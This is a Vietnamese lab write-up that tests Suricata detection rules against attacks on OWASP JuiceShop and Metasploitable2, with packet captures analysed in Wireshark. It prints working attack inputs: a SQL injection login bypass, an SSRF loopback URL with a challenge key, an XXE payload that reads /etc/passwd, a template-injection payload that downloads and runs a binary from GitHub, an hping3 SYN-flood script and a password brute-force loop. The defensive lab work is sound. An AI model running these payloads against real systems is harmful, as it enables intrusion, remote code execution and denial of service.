# Attack Analysis
 
## Web Application Detection
 
Rule dạng signature, match trực tiếp payload trong HTTP request (`http.uri`, `http.request_body`, `http.user_agent`) nhắm vào OWASP JuiceShop (port 3000).
 
### 1. SQL Injection
 
#### Chuẩn bị
 
Rule phát hiện SQL injection: [`sql-detect.rules`](../rules/sql-detect.rules). Rule dùng sticky buffer của Suricata 8 (`http.request_body`, `http.uri`) kết hợp PCRE, yêu cầu quote đi kèm keyword/comment SQL thay vì chỉ match ký tự đơn lẻ, đồng thời tách theo từng kỹ thuật SQLi để dễ phân loại khi điều tra.
 
| SID | Pattern | Buffer | Kỹ thuật |
|---|---|---|---|
| 1200001 | `'`/`"` + `OR/UNION/SELECT` | Request Body | Auth Bypass / UNION-based |
| 1200002 | `'`/`"` + `OR/UNION/SELECT` | URI | Auth Bypass / UNION-based (GET) |
| 1200003 | `'`/`"` + `--`/`#`/`/*` | Request Body | Comment Injection |
| 1200004 | `'`/`"` + `--`/`#`/`/*` | URI | Comment Injection (GET) |
| 1200005 | `information_schema.tables` + `--`/`#`/`/*` | Request Body | Schema Enumeration |
| 1200006 | `information_schema.tables` + `--`/`#`/`/*` | URI | Schema Enumeration (GET) |
| 1200007 | `'`/`"` + `CASE/IF` | Request Body | Boolean-based Blind |
| 1200008 | `'`/`"` + `CASE/IF` | URI | Boolean-based Blind (GET) |
| 1200009 | `'`/`"` + `SLEEP/BENCHMARK` | Request Body | Time-based Blind |
| 1200010 | `'`/`"` + `SLEEP/BENCHMARK` | URI | Time-based Blind (GET) |
| 1200011 | `'`/`"` + `EXTRACTVALUE/UPDATEXML` | Request Body | Error-based SQLi |
| 1200012 | `'`/`"` + `EXTRACTVALUE/UPDATEXML` | URI | Error-based SQLi (GET) |
| 1200013 | `'`/`"` + `LOAD_FILE/INTO OUTFILE` | Request Body | File Read/Write |
| 1200014 | `'`/`"` + `LOAD_FILE/INTO OUTFILE` | URI | File Read/Write (GET) |
| 1200015 | `CONCAT()/DATABASE()/VERSION()/USER()` | Request Body | Database Fingerprinting |
| 1200016 | `CONCAT()/DATABASE()/VERSION()/USER()` | URI | Database Fingerprinting (GET) |
 
Chỉ sinh cảnh báo khi quote xuất hiện cùng keyword SQL, giảm false positive với dữ liệu hợp lệ chứa dấu `'` (vd: `Vinh'Tam`). `http.request_body`/`http.uri` giới hạn phạm vi kiểm tra đúng vào Request Body hoặc URI. 
 
Ta thêm rule này vào và thực hiện như bước set up lab.
 
#### Mô tả
 
Attacker inject SQL payload vào HTTP request nhắm vào OWASP JuiceShop chạy trên port 3000, nhằm bypass authentication hoặc extract dữ liệu.
 
#### Thực hiện
 
Trước khi bắt đầu tấn công, trên máy Suricata ta chạy `tcpdump` để capture traffic song song với Suricata đang monitor.
 
```bash
sudo tcpdump -w dos.pcap -i ens33
```
 
**Trên Kali Linux:**
 
Đầu tiên trên kali tôi sẽ sử dụng burp suite. Thì trong lab này thì juice shop bị SQLi trong trang đăng nhập. Lí do tôi biết là khi nhập dấu `'` thì nó xuất hiện lỗi.
 
<img width="1607" height="886" alt="image" src="https://github.com/user-attachments/assets/43434aa7-a178-4916-b056-a9059c8cd02a" />

Kiểm tra trong burp suite thì ta thấy gói tin liên quan đến cái trang đăng nhập hồi nãy.
 
<img width="634" height="602" alt="image" src="https://github.com/user-attachments/assets/5873bb27-28bb-4c03-9da0-6177341d72e5" />

Khi này tôi nhập payload `' OR true --` khiến câu query SQL luôn trả về true, từ đó bypass authentication và đăng nhập được với quyền admin. Thì có thể ví dụ Query gốc có dạng WHERE email='...' AND password='...', sau khi inject thành WHERE email='' OR true -- thì phần password bị comment out và điều kiện luôn đúng.
 
<img width="1599" height="896" alt="image" src="https://github.com/user-attachments/assets/66b73d60-0870-4c1e-8f41-3643a675b9d6" />

#### Suricata Alert
 
Đây là alert được suricata tạo ra.
 
<img width="1846" height="143" alt="image" src="https://github.com/user-attachments/assets/06d8fc1b-4446-4317-9bb6-329e1506f96b" />

#### Wireshark Analysis
 
Ta dừng tcpdump lại. Và thu được file pcap.
 
<img width="988" height="792" alt="image" src="https://github.com/user-attachments/assets/3343bdd8-ee94-431c-a603-3e81522ce453" />

Ví dụ như trong hình thì kẻ tấn công đang cố thử dùng dấu nháy đơn `'` liệu có xuất hiện lỗi hay gì không. Thì attacker đã thành công trong việc đó. Tiếp đó kẻ tấn công thử nhập `' OR true --` và nhưu hình dưới thì attacker đã thành công trong việc vào tài khoản admin.
 
<img width="953" height="653" alt="image" src="https://github.com/user-attachments/assets/b89af45b-d0dd-4abe-8cfe-ac9125ed4d22" />

#### MITRE ATT&CK Mapping
 
| Tactic         | Technique                         | ID    |
| -------------- | --------------------------------- | ----- |
| Initial Access | Exploit Public-Facing Application | T1190 |
 
---
 
### 2. Server-Side Request Forgery (SSRF)
 
#### Chuẩn bị
 
Rule phát hiện: [`SSRF-detect.rules`](../rules/SSRF-detect.rules).
 
| SID        | Payload dạng              | Kỹ thuật                              |
| ---------- | ------------------------- | -------------------------------------- |
| 3001001/02 | `http://127.0.0.1[:port]` | IPv4 loopback                         |
| 3001003/04 | `http://localhost[:port]` | Localhost                             |
| 3001005/06 | `http://[::1][:port]`     | IPv6 loopback                         |
| 3001007/08 | `file:///etc/passwd`      | Local file access                     |
| 3001009/10 | `http://0177.0.0.1`       | Loopback dạng octal (bypass filter)   |
| 3001011/12 | `http://2130706433`       | Loopback dạng decimal (bypass filter) |
 
Ta thêm rule này vào và thực hiện như bước set up lab.
 
#### Mô tả
 
Attacker lợi dụng chức năng server tự fetch URL (vd tải ảnh từ URL) để buộc server gửi request đến địa chỉ nội bộ/loopback, nhằm truy cập tài nguyên nội bộ không public.
 
> **Note:** Intended solution yêu cầu tải & RE 1 binary test để tìm service ẩn, rồi SSRF tới đó.
> Ở đây khai thác trực tiếp qua logic flaw: `abused_ssrf_bug` chỉ cần URL match chuỗi
> `solve/challenges/server-side`, không cần binary nào cả.
 
#### Thực hiện
 
Chạy `tcpdump` trên máy Suricata như các attack trước. 
 
```
sudo tcpdump -w ssrf.pcap -i ens33
```
 
Bây giờ tôi sẽ xem xét kĩ trang web liệu chỗ nào đang bị dính SSRF. Thì khi nào `http://192.168.15.128:3000/profile` Tui thấy 1 trường dùng để nhận Image URL.
 
<img width="1623" height="775" alt="image" src="https://github.com/user-attachments/assets/ba0a37eb-f0ac-49b2-9543-42d3b77a4f86" />

Bây giờ tôi sẽ test thử cái chức năng đó. Thì ở đây tui sẽ chuẩn bị sẳng 1 link hình ảnh.
 
<img width="1332" height="708" alt="image" src="https://github.com/user-attachments/assets/ca4d5e20-3893-4d36-9d50-6953b8b95e1a" />

Tiếp đó tôi sẽ bấm vào Link Imgae.
 
<img width="1518" height="717" alt="image" src="https://github.com/user-attachments/assets/e6f6c209-5958-4304-a876-a71bbd93684d" />

Thì ta thấy hình ảnh đã bị thay đổi vậy bây giờ. 1 attacker sẽ hỏi liệu có thể sử dụng loopback address để truy cập được các tài nguyên nội bộ được không. Trước hết tui sẽ vào source code của JuiceShop để xem đoạn bị lỗi đó như nào. Tại `profileImageUrlUpload.ts`, ta thấy server sẽ tự fetch bất kỳ URL nào được truyền vào `imageUrl` đây chính là SSRF sink. Đặc biệt có đoạn:
 
```
if (url.match(/(.)*solve\/challenges\/server-side(.)*/) !== null) req.app.locals.abused_ssrf_bug = true
```

<img width="1186" height="795" alt="image" src="https://github.com/user-attachments/assets/4c9c43e5-f973-41e8-9ec8-47594f851b38" />

Nghĩa là nếu URL truyền vào có chứa `solve/challenges/server-side` thì flag `abused_ssrf_bug` sẽ được set `true`. Tiếp tục xem trong `verify.ts`, điều kiện để challenge được coi là solved là `req.query.key === 'tRy_H4rd3r_n0thIng_iS_Imp0ssibl3'` kết hợp với flag `abused_ssrf_bug === true`.

<img width="1067" height="380" alt="image" src="https://github.com/user-attachments/assets/5cbb61ab-2262-43c4-a564-affce89f99d5" />
 
Kết hợp lại, tui sẽ dùng loopback address để buộc server tự gửi request đến chính route solve kèm key đó:
 
```
http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
```
 
Nhập payload trên vào ô Image URL và bấm bào Link Image.
 
<img width="1594" height="798" alt="image" src="https://github.com/user-attachments/assets/e081677d-0b21-4d94-8621-c3a1c00f5fc3" />

Server nhận request, tự fetch URL này (chính là gọi lại chính nó qua loopback), khiến `abused_ssrf_bug` được set `true` và key hợp lệ và challenge SSRF được giải.
 
<img width="1652" height="817" alt="image" src="https://github.com/user-attachments/assets/6a3f8048-80bf-44c7-9af6-836fb416c399" />

#### Suricata Alert
 
<img width="1576" height="93" alt="image" src="https://github.com/user-attachments/assets/81feb721-f042-4b64-a0c8-ab3d8e294b7b" />

Như hình trên thì 2 lần mà attacker sử dụng localhost đã được ghi lại. Và cũng chứng minh là rule hoạt động tốt.
 
#### Wireshark Analysis
 
Khi này ta sẽ tiến hành phân tích file pcap. Tiến hành query `http.request.method == POST`
 
<img width="1591" height="898" alt="image" src="https://github.com/user-attachments/assets/7e8e29d4-40c8-4d05-95ed-0fa2d6d7bd44" />

Tiếp đó Follow Http Stream.
 
<img width="1033" height="687" alt="image" src="https://github.com/user-attachments/assets/dd328588-2a7d-4575-87d9-caf98e987748" />

Như trên hình là đoạn imageUrl liên quan đến loopback address mà ta đã nhập.

<img width="1037" height="695" alt="image" src="https://github.com/user-attachments/assets/3129e32c-b0c5-49ab-a89b-ce6586d482db" />

Và trong hình là đoạn payload giúp cho ta thành công trong việc khai thác SSRF trên juice shop.
 
<img width="1036" height="669" alt="image" src="https://github.com/user-attachments/assets/b7cad92b-4f06-4e92-b4bc-7ea599581c22" />

Cuối cùng là đoạn chứng minh ta đả giải thành công
 
#### MITRE ATT&CK Mapping
 
| Tactic         | Technique                         | ID    |
| -------------- | --------------------------------- | ----- |
| Initial Access | Exploit Public-Facing Application | T1190 |
 
---
 
### 3. Server-Side Template Injection (SSTI)
 
#### Chuẩn bị
 
Rule phát hiện: [`SSTI-detect.rules`](../rules/SSTI-detect.rules).
 
| SID        | Payload dạng        | Kỹ thuật                 |
| ---------- | ------------------- | ------------------------ |
| 6001001/02 | `{{7*7}}`           | Jinja2/Twig double curly |
| 6001003/04 | `${7*7}` / `#{7*7}` | Dollar/Hash expression   |
| 6001005/06 | `<%= 7*7 %>`        | ERB expression           |
 
Ta thêm rule này vào và thực hiện như bước set up lab.
 
#### Mô tả
 
Attacker chèn cú pháp template engine vào input được server render lại; nếu bị thực thi có thể dẫn tới RCE.
 
> **Note:** Intended solution dùng RCE qua `eval()` để tải file test. Ở đây chỉ dùng payload đọc
> (`#{7*7}`) để chứng minh lỗi `abused_ssti_bug` đã được set ngay khi username match regex,
> trước cả khi `eval()` chạy.
 
#### Thực hiện
 
Chạy `tcpdump` trên máy Suricata như các attack trước.
 
```
sudo tcpdump -w ssti.pcap -i ens33
```
 
Thử payload `{{7*7}}` vào trường nghi ngờ thì ở đây chính là trường đổi username. Thì bây giờ ta sẽ đọc source code trước để biết tại sao lại là trường username, tại file `userProfile.ts`.
 
<img width="860" height="440" alt="image" src="https://github.com/user-attachments/assets/0a8968e0-84d5-4203-b0d0-e72d17928a23" />

Thì như đoạn trong hình nó sẽ tìm pattern `#{..}`, tiếp đó sẽ lấy phần bên trong `const code = username?.substring(2, username.length - 1)` và đưa trực tiếp vào `eval()`, hàm đó giúp ta thực thi code tùy ý. Nên ở đây tôi sẽ tiến hành nhập thử đoạn payload test SSTI là
 
```
#{7*7}
```
 
Nếu response trả về `49` nghĩa là bị SSTI.
 
<img width="670" height="634" alt="image" src="https://github.com/user-attachments/assets/5d2b7f62-b3a5-4a11-a40d-1f5f1db07e97" />

Và như trong hình thì ta thấy tên đã bị đổi thành 49. Khi này ta chỉ cần GET `/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`. Check log thì ta thấy SSTI đã được giải.
 
<img width="552" height="44" alt="image" src="https://github.com/user-attachments/assets/06acb864-2124-49f2-846d-e3b9adb45948" />

Cách khác là làm theo đúng hint gốc của SSTI (RCE tải file test):
 
```
#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}
```
 
#### Suricata Alert
 
<img width="1590" height="61" alt="image" src="https://github.com/user-attachments/assets/b26f553a-b91f-4ac1-ae5b-b129a17721b1" />

Suricata đã ghi lại alert khớp SID 6001003/04 (Dollar/Hash expression) khi payload `#{7*7}` được gửi trong trường username.
 
#### Wireshark Analysis
 
Query `http.request.body contains "username"` để lọc đúng request đổi username.
 
<img width="1035" height="453" alt="image" src="https://github.com/user-attachments/assets/b27d2966-9fc5-411a-8fe3-48830cc0a869" />

Trong hình là đoạn payload test SSTI (`#{7*7}`) đã được ghi lại trong Wireshark.
 
#### MITRE ATT&CK Mapping
 
| Tactic         | Technique                         | ID    |
| -------------- | ---------------------------------- | ----- |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution      | Command and Scripting Interpreter | T1059 |
 
---
 
### 4. XML External Entity (XXE)
 
#### Chuẩn bị
 
Rule phát hiện: [`XXE-detect.rules`](../rules/XXE-detect.rules).
 
| SID     | Payload dạng                 | Kỹ thuật                        |
| ------- | ----------------------------- | -------------------------------- |
| 7001001 | `<!ENTITY xxe SYSTEM "...">` | External entity - SYSTEM/PUBLIC |
| 7001002 | `<!ENTITY ...>`              | Generic ENTITY declaration      |
 
Ta thêm rule này vào và thực hiện như bước set up lab.
 
#### Mô tả
 
Attacker gửi XML payload chứa external entity để đọc file nội bộ (vd `/etc/passwd`) hoặc thực hiện SSRF thông qua XML parser không disable external entity.
 
#### Thực hiện
 
Chạy `tcpdump` trên máy Suricata như các attack trước.
 
```
sudo tcpdump -w XXE.pcap -i ens33
```
 
Đầu tiên tôi sẽ đăng 1 file PDF bình thường qua chức năng upload (endpoint `/file-upload`) để bắt lại request gốc. Tiếp đó dùng Burp Suite để intercept và sửa lại request: đổi `filename` thành `payload.xml`, `Content-Type` thành `application/xml`, và thay body bằng payload XXE:
 
```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```
 
<img width="639" height="643" alt="image" src="https://github.com/user-attachments/assets/ebf70a70-021e-4758-a0d4-4e0e17b1901a" />

Và như trong hình ta dã khai thác thành công.
 
<img width="1297" height="734" alt="image" src="https://github.com/user-attachments/assets/f5afb9dc-0dd7-424e-a9b8-87dae6b5400c" />

#### Suricata Alert
 
<img width="1596" height="51" alt="image" src="https://github.com/user-attachments/assets/abc86700-9b6f-44ce-ab0a-2fbda315ffcd" />

Suricata ghi nhận alert SID 7001001 (XXE Attempt - External Entity) từ Kali (192.168.15.130) đến JuiceShop (192.168.15.128:3000).
 
#### Wireshark Analysis
 
Khi này attacker sẽ đăng một 1 file pdf bình thường trước. Tiếp đó kẻ tấn công sẽ tiến hành sử dụng các công cụ ví dụ như Burp để tiến hành thay đổi gói tin.
 
<img width="1063" height="910" alt="image" src="https://github.com/user-attachments/assets/eb754223-f0e3-44db-b663-6f399854760b" />

Follow HTTP Stream của request chứa payload `payload.xml`, thấy rõ request gửi `<!ENTITY xxe SYSTEM "file:///etc/passwd">` và response trả về nội dung `/etc/passwd` bị leak ngay trong body.
 
<img width="1015" height="625" alt="image" src="https://github.com/user-attachments/assets/e848a3eb-4b3d-459a-a3e9-f2d48a4fcee2" />

Khi này kẻ tấn công đã thay đổi filename và content-type như trong ảnh kèm theo là đoạn payload. Và khi này hình dưới là kẻ tấn công đã khai thác thành công.
 
<img width="1039" height="581" alt="image" src="https://github.com/user-attachments/assets/37cda238-7db3-4529-889f-18077bca5378" />

#### MITRE ATT&CK Mapping
 
| Tactic         | Technique                         | ID    |
| -------------- | --------------------------------- | ----- |
| Initial Access | Exploit Public-Facing Application | T1190 |
 
---
 
### 5. Malicious User-Agent (Recon Tool Fingerprinting)
 
#### Chuẩn bị
 
Rule phát hiện: [`Malicious-User-Agent-Detect.rules`](../rules/Malicious-User-Agent-Detect.rules) match User-Agent chứa tên công cụ recon/scan phổ biến.
 
Ta thêm rule này vào và thực hiện như bước set up lab.
 
#### Mô tả
 
Phát hiện traffic recon/scan tự động từ các công cụ pentest phổ biến dựa vào User-Agent mặc định của công cụ.
 
#### Thực hiện
 
Chạy `tcpdump` trên máy Suricata như các attack trước. 
 
```
sudo tcpdump -w M-User-agent.pcap -i ens33
```
 
Ở đây tui sẽ chạy `sqlmap -u http://192.168.15.128:3000/rest/products/search?q=` từ Kali nhắm vào JuiceShop.
 
<img width="1265" height="602" alt="image" src="https://github.com/user-attachments/assets/0b2695c8-632f-4815-97dc-4520f79bec20" />

Mục đích là test xem liệu có alert nào được sinh ra không.
 
#### Suricata Alert
 
Khi này tui sẽ vào xem liệu có alert nào được sinh ra không.
 
<img width="1576" height="487" alt="image" src="https://github.com/user-attachments/assets/ecc1a0d8-ea75-454d-a1cd-35027b3bd2d2" />
Thì ta đã thấy rule đã được kích hoạt thành công
 
#### Wireshark Analysis
 
<img width="1554" height="327" alt="image" src="https://github.com/user-attachments/assets/2315d53a-4fcf-47e7-be82-d4c13655c309" />

Query `http.user_agent contains "sqlmap"` để lọc đúng các request từ công cụ scan.
 
<img width="1554" height="327" alt="image" src="https://github.com/user-attachments/assets/2315d53a-4fcf-47e7-be82-d4c13655c309" />

Trong hình ta thấy hàng loạt GET request đến `/rest/products/search` với các payload SQLi được URL-encode liên tiếp (`UNION`, `EXTRACTVALUE`, `CAST`, `CHR`...) đây là pattern đặc trưng của sqlmap khi tự động fuzz tham số. Tất cả đều xuất phát từ cùng 1 source IP (192.168.15.130) trong khoảng thời gian rất ngắn,
xác nhận đây là traffic scan tự động, không phải người dùng thông thường.
 
#### MITRE ATT&CK Mapping
 
| Tactic         | Technique                               | ID        |
| -------------- | ---------------------------------------- | --------- |
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 |
 
---

## Network & Behavioral Detection

Rule dạng **threshold-based**, dựa trên tần suất/hành vi thay vì match nội dung  đây là nhóm áp dụng **rule tuning** (điều chỉnh `count`/`seconds`) để cân bằng false positive/negative.

### 1. DoS - SYN Flood

#### Chuẩn bị

Ở đây tôi đã chuẩn bị sẳn một rule phát hiện tấn công DoS.

```
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"[!] DOS flood inbound, Potential DOS"; flow:to_server; flags: S,12; threshold: type both, track by_dst, count 5000, seconds 5; classtype:attempted-dos; sid:5; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"[!] DOS flood outbound, Potential DOS"; flow:to_server; flags: S,12; threshold: type both, track by_dst, count 5000, seconds 5; classtype:attempted-dos; sid:6; rev:1;)
```

Ta thêm rule này vào và thực hiện như bước set up lab.

#### Mô tả

Attacker gửi lượng lớn SYN packet đến target nhằm làm cạn kiệt tài nguyên và gây **Denial of Service**.

#### Thực hiện

Trước khi bắt đầu tấn công, trên máy Suricata ta chạy `tcpdump` để capture traffic song song với Suricata đang monitor.

```bash
sudo tcpdump -w dos.pcap -i ens33
```

**Trên Kali Linux:**

Tôi sẽ chuẩn bị 1 đoạn file python tên là dos.py có nội dung như dưới. Đoạn code đó dùng để thực hiện việc DoS. Vào máy metasploitable2 có ip là `192.168.15.131`

```python
import os

target_ip = "192.168.15.131"
os.system("hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source "+target_ip)
```

Tiếp đó thục thi dos.py

```
sudo python3 dos.py
```

<img width="636" height="182" alt="image" src="https://github.com/user-attachments/assets/99dfdb9d-d383-443a-954e-2cd419648415" />

#### Suricata Alert

<img width="1542" height="140" alt="image" src="https://github.com/user-attachments/assets/86c99a0e-73b7-47b6-9661-6665021a2a42" />

#### Wireshark Analysis

Khi này ta dừng tcpdump và thu được một file pcap.

<img width="1538" height="781" alt="image" src="https://github.com/user-attachments/assets/daf08efb-eba2-4f27-93cb-28b1ce603351" />

Như trong hình, source IP liên tục thay đổi do attacker sử dụng tùy chọn `--rand-source`, nhằm gây khó khăn cho việc truy vết và chặn theo IP nguồn. Đồng thời, một lượng lớn **TCP SYN packets** kèm payload `XXXXXXXX...` được gửi liên tục đến target trong khoảng thời gian rất ngắn. Hành vi này có thể khiến máy target tiêu tốn tài nguyên để xử lý các kết nối giả mạo, từ đó dẫn đến tình trạng **Denial of Service**.

#### MITRE ATT&CK Mapping

| Tactic | Technique                 | ID    |
| ------ | ------------------------- | ----- |
| Impact | Network Denial of Service | T1498 |

### Rule Tuning - DoS Detection

#### Vấn đề rule gốc

- Threshold cố định **5000 packet/5s (~1000 pps)** nên chỉ phát hiện được SYN Flood tốc độ cao.
- Dễ bỏ sót **low-rate SYN Flood**.
- Chưa phân biệt rõ cảnh báo **inbound** và **outbound**.

#### Hướng tuning

Giảm threshold để tăng độ nhạy, đồng thời giữ `track by_dst` và `threshold type both` nhằm hạn chế alert trùng lặp.

| SID | Threshold      | Hướng                      | Kỹ thuật  |
| --- | -------------- | -------------------------- | --------- |
| 5   | 1000 packet/5s | Inbound (EXTERNAL → HOME)  | SYN Flood |
| 6   | 1000 packet/5s | Outbound (HOME → EXTERNAL) | SYN Flood |

#### Vì sao giảm false negative

- Giảm threshold từ **5000** xuống **1000 packet/5s** giúp phát hiện **low-rate SYN Flood**.
- `track by_dst` và `threshold type both` chỉ tạo **1 alert/đích/5 giây**, hạn chế spam alert.
- Vẫn sử dụng `flags:S,12` để chỉ phát hiện các gói SYN có đặc trưng của SYN Flood.

#### Full Rules ([`dos-detect-tuned.rules`](../rules/dos-detect-tuned.rules))

```
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"[!] DOS flood inbound, Potential DOS"; flow:to_server; flags:S,12; threshold:type both, track by_dst, count 1000, seconds 5; classtype:attempted-dos; sid:5; rev:2;)

alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"[!] DOS flood outbound, Potential DOS"; flow:to_server; flags:S,12; threshold:type both, track by_dst, count 1000, seconds 5; classtype:attempted-dos; sid:6; rev:2;)
```

=> Dưới đây là kết quả

<img width="1398" height="376" alt="image" src="https://github.com/user-attachments/assets/60380dc4-11b0-444f-84ad-d059afa1d0ff" />

---

### 2. HTTP Brute-Force Login

#### Chuẩn bị

Rule phát hiện: [`HTTP-Brute-Force-Detect.rules`](../rules/HTTP-Brute-Force-Detect.rules), phát hiện POST liên tục đến `/rest/user/login`, threshold count 10/30s, track by_src.

```
alert http any any -> $HOME_NET 3000 ( msg:"HTTP Brute-Force Login Attempt Detected"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/rest/user/login"; threshold:type both, track by_src, count 10, seconds 30; sid:9000001; rev:1; )
```

Ta thêm rule này vào và thực hiện như bước set up lab.

#### Mô tả

Attacker thử nhiều cặp username/password liên tiếp vào endpoint đăng nhập của JuiceShop nhằm dò đúng credential hợp lệ.

#### Thực hiện

Chạy `tcpdump` trên máy Suricata như các attack trước.

```bash
sudo tcpdump -w BruteForce.pcap -i ens33
```

Chuẩn bị sẵn wordlist mật khẩu phổ biến, mật khẩu thật của tài khoản test (`conmeo@gmail.com`) là `football`, đặt ở dòng cuối để mô phỏng brute-force thực tế.

<img width="274" height="298" alt="image" src="https://github.com/user-attachments/assets/09c7ec17-a97c-47bb-a760-023913ed184a" />

Script gửi hơn 10 request POST đến `/rest/user/login` trong 30 giây:

```bash
while read -r pass; do
  curl -s -o /dev/null -w "%{http_code} $pass\n" -X POST http://192.168.15.128:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"conmeo@gmail.com\",\"password\":\"$pass\"}"
done < /home/lab/Desktop/wordlist
```

#### Suricata Alert

<img width="1584" height="74" alt="image" src="https://github.com/user-attachments/assets/bed76cd3-bd69-4b88-88ab-923327a5f384" />

#### Wireshark Analysis

<img width="1456" height="242" alt="image" src="https://github.com/user-attachments/assets/e18b4f73-2152-4a66-a89f-f5231f51e9a6" />

Follow HTTP Stream:

<img width="1020" height="325" alt="image" src="https://github.com/user-attachments/assets/8ce89770-910f-42fa-b182-3b95ed493977" />

Phần lớn response là `401 Unauthorized`, đến request cuối (mật khẩu đúng `football`) trả về `200` attacker đăng nhập thành công.

<img width="1047" height="733" alt="image" src="https://github.com/user-attachments/assets/fbfa4d78-ba43-49cc-85db-aa30ac711866" />

#### MITRE ATT&CK Mapping

| Tactic            | Technique                      | ID        |
| ----------------- | ------------------------------ | --------- |
| Credential Access | Brute Force: Password Guessing | T1110.001 |

### Rule Tuning - HTTP Brute-Force Detection

#### Vấn đề rule gốc

- Chỉ đếm số request POST, không xét response không phân biệt được brute-force thật với user gõ nhầm vài lần rồi login đúng.
- Threshold cố định 10/30s, dễ né bằng brute-force chậm (low-and-slow).

#### Hướng tuning

Thêm rule mới bám theo response `401` thay vì chỉ đếm request và chính xác hơn vì loại được các lần login thành công ra khỏi phép đếm.

| SID     | Threshold      | Buffer                     | Mục đích                     |
| ------- | -------------- | --------------------------- | ------------------------------ |
| 9000001 | 10 request/30s | `http.uri` (request)        | Đếm tần suất request           |
| 9000002 | 5 lần 401/60s  | `http.stat_code` (response) | Đếm tần suất thất bại thực tế  |

`track by_dst` ở rule 9000002 vì packet đi chiều from_server đích chính là client (attacker).

#### Full Rules

```
alert http $HOME_NET 3000 -> any any ( msg:"[TUNED] HTTP Brute-Force - Repeated 401 Responses"; flow:established,from_server; http.stat_code; content:"401"; threshold:type both, track by_dst, count 5, seconds 60; sid:9000002; rev:1; )
```

---

### 3. Nmap Port Scan

#### Chuẩn bị

Rule dưới đây là bản gốc, trước khi tuning:

```suricata
alert tcp any any -> any [21,22,23,25,53,80,88,110,135,137,138,139,143,161,389,443,445,465,514,587,636,853,993,995,1194,1433,1720,3306,3389,8080,8443,11211,27017,51820] (msg:"NMAP SYN Scan - Common Ports"; flow:to_server,stateless; flags:S; threshold:type threshold,track by_src,count 20,seconds 10; sid:1100001; rev:1;)
alert tcp any any -> any ![21,22,23,25,53,80,88,110,135,137,138,139,143,161,389,443,445,465,514,587,636,853,993,995,1194,1433,1720,3306,3389,445,8080,8443,11211,27017,51820] (msg:"NMAP SYN Scan - Uncommon Port"; flow:to_server,stateless; flags:S; threshold:type threshold,track by_src,count 7,seconds 135; sid:1100002; rev:1;)
```

Ta thêm rule này vào và thực hiện như bước set up lab.

#### Mô tả

Attacker quét cổng để xác định dịch vụ đang chạy trên target trước khi khai thác.

#### Thực hiện

```bash
sudo tcpdump -w nmap-d.pcap -i ens33
```

Chạy `nmap -sS <target>` từ Kali nhắm vào Metasploitable2/JuiceShop.

<img width="1027" height="537" alt="image" src="https://github.com/user-attachments/assets/b689ef71-c77a-4c2b-9d21-941a5f9e6352" />

#### Suricata Alert

<img width="1572" height="281" alt="image" src="https://github.com/user-attachments/assets/6251568f-46b5-489b-8f2a-2f9e07c0ee93" />

Ta thấy rằng suricata đã bắt được các Common Port và Uncommon Port

#### Wireshark Analysis

Filter port bị scan trúng (SYN-ACK từ target):

```
tcp.flags.syn==1 && tcp.flags.ack==1 && ip.src==192.168.15.132
```

<img width="1589" height="490" alt="image" src="https://github.com/user-attachments/assets/b190d2e2-b539-4dcd-96b7-a5c3677c752f" />

Hình trên cho ta thấy rằng các port đã bị nmap scan ta có thể đối chiếu lại với kết quả của nmap

#### MITRE ATT&CK Mapping

| Tactic         | Technique                                | ID        |
| -------------- | ------------------------------------------ | --------- |
| Reconnaissance | Active Scanning: Vulnerability Scanning    | T1595.002 |

### Rule Tuning - Nmap Scan Detection

#### Vấn đề rule gốc

- Scope `any -> any`, chưa giới hạn đích `$HOME_NET`.
- Port `445` bị liệt kê **trùng lặp** trong danh sách uncommon-port.
- Threshold common-ports 20/10s chỉ bắt scan nhanh, dễ bỏ sót scan chậm (`-T1`/`-T2`).
- `type threshold` thay vì `type both` không nhất quán với các rule khác trong bộ.

#### Hướng tuning

- Scope lại đích `$HOME_NET`, bỏ port `445` trùng.
- Hạ threshold common-ports xuống 10/20s để nhạy hơn với scan chậm.
- Đổi `type both` cho đồng bộ.

#### Full Rules

```suricata
alert tcp any any -> any [21,22,23,25,53,80,88,110,135,137,138,139,143,161,389,443,445,465,514,587,636,853,993,995,1194,1433,1720,3306,3389,8080,8443,11211,27017,51820] (msg:"[TUNED] NMAP SYN Scan - Common Ports"; flow:to_server,stateless; flags:S; threshold:type both, track by_src, count 10, seconds 20; classtype:attempted-recon; sid:1100001; rev:2;)

alert tcp any any -> any ![21,22,23,25,53,80,88,110,135,137,138,139,143,161,389,443,445,465,514,587,636,853,993,995,1194,1433,1720,3306,3389,8080,8443,11211,27017,51820] (msg:"[TUNED] NMAP SYN Scan - Uncommon Port"; flow:to_server,stateless; flags:S; threshold:type both, track by_src, count 7, seconds 135; classtype:attempted-recon; sid:1100002; rev:2;)
```

